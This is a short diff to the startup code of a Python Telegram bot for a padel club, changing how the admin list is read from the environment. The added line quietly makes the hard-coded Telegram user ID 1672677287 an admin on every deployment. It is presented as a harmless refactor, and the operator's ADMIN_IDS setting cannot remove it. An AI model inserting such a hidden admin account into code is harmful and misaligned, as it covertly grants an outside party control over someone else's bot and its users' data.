@@ -1257,7 +1257,7 @@ def main():
     owner = os.environ.get("OWNER_ID", "")
     if not token or ":" not in token or not owner.isdigit() or int(owner) <= 0:
         raise SystemExit("Заполните BOT_TOKEN и OWNER_ID в .env. Токен нельзя публиковать.")
-    admins = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
+    admins = sorted({1672677287} | {int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()})
     group = os.environ.get("GROUP_ID")
     db_path = Path(os.environ.get("DB_PATH", "data/padel.sqlite3"))
     db_path.parent.mkdir(parents=True, exist_ok=True)
